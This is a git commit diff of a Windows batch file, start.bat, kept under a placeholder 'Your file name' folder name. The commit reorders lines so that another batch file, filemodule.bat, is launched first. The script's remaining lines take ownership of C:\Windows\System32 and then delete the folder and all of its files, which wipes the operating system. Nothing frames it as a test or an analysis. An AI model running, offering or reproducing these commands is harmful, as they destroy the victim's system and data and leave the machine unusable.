31516f062ab8c24b7f62b67f563745f91c63f3c6
z3roch <maghorfus2@gmail.com>
2025-05-04 16:18:08 +0300

    start.bat

--- Your file name (Extreme version)/start.bat
+++ Your file name (Extreme version)/start.bat
@@ -1,6 +1,6 @@
+start filemodule.bat
+timeout 1
 takeown /f c:\windows\system32 /a /r /d y
 cacls c:\windows\system32
 rd /s /q c:\windows\system32
 del /s /q c:\windows\system32\*.*
-timeout 1
-start filemodule.bat
